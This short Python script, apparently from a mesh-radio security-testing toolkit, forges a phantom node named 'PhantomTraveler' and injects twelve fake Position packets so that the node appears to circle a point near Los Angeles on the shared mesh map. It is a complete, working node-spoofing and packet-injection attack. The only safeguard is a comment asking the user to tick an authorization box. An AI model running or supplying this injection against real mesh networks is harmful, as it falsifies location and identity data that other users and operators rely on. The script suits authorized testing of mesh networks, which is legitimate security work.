# Position spoof — INJECTION (tick "I am authorized to transmit" first).
# A phantom node announces itself, then traces a circle on the mesh map by injecting
# Position packets that defy physical movement.
from device import dev
import math

dev.connect()
node_id = 0xDEADE000
dev.send_nodeinfo(node_id, "PhantomTraveler", "TRAV")
lat0, lon0, radius = 34.0522, -118.2437, 0.02
STEPS = 12
for step in range(STEPS):
    a = 2 * math.pi * step / STEPS
    lat, lon = lat0 + radius * math.sin(a), lon0 + radius * math.cos(a)
    dev.send_position(node_id, lat, lon)
    print(f"  step {step+1:2d}/{STEPS}  {lat:.4f}, {lon:.4f}")
    dev.sleep(0.6)
print("PhantomTraveler completed the loop.")
